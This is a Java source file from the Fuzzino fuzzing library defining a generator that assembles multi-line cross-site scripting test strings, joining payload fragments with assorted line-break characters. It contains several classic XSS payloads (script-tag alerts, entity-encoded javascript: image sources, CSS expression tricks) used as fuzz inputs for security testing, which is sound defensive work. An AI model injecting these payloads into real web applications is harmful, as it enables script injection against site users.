package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string;

import de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.ComputableFuzzingHeuristic;
import de.fraunhofer.fokus.fuzzing.fuzzino.request.StringSpecification;
import de.fraunhofer.fokus.fuzzing.fuzzino.request.StringType;

public class XSSMultipleLinesInputGenerator extends ComposedStringGenerator {

	public XSSMultipleLinesInputGenerator(StringSpecification stringSpec,long seed) {
		super(stringSpec, seed);
		initHeuristics();
	}
	
	public XSSMultipleLinesInputGenerator(StringSpecification stringSpec,long seed,ComputableFuzzingHeuristic<?> owner) {
		super(stringSpec, seed, owner);
		initHeuristics();
	}


	private void initHeuristics() {
		//TODO: maybe make the hardcoded javascript function call (alert) dynamic?
		ConcreteValuesGenerator lineBreakGenerator = new ConcreteValuesGenerator(stringSpec, seed, owner, 
			new Character((char) 0x000A).toString(),
			new Character((char) 0x000B).toString(),
			new Character((char) 0x000C).toString(),
			new Character((char) 0x000D).toString(),
			new Character((char) 0x000D).toString()+new Character((char) 0x000A).toString(),
			new Character((char) 0x0085).toString(),
			new Character((char) 0x2028).toString(),
			new Character((char) 0x2029).toString()
		);
		ConcreteValuesGenerator line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";");
		ConcreteValuesGenerator line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--");
		ConcreteValuesGenerator line3 = new ConcreteValuesGenerator(stringSpec, seed, owner, "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2,lineBreakGenerator,line3));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "&#39;&#88;&#83;&#83;&#39;&#41;>");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "exp/*<A STYLE='no\\xss:noxss(\"*//*\");");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "<!--[if gte IE 4]>");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, " <SCRIPT>alert('XSS');</SCRIPT>");
		line3 = new ConcreteValuesGenerator(stringSpec, seed, owner, " <![endif]-->");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2,lineBreakGenerator,line3));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "<? echo('<SCR)';");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owner, "<DIV STYLE=\"width:\"");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owner, "\"expression(alert('XSS'));\">");
		heuristics.add(new Combinator(stringSpec,seed,owner,line1,lineBreakGenerator,line2));

	}


	/**
	 * 
	 */
	private static final long serialVersionUID = 556638849065722783L;

	@Override
	public boolean canCreateValuesFor(StringSpecification stringSpec) {
		return stringSpec.getType().equals(StringType.XSS);
	}

	@Override
	public String getName() {
		return "XSSMultipleLinesInput";
	}

}
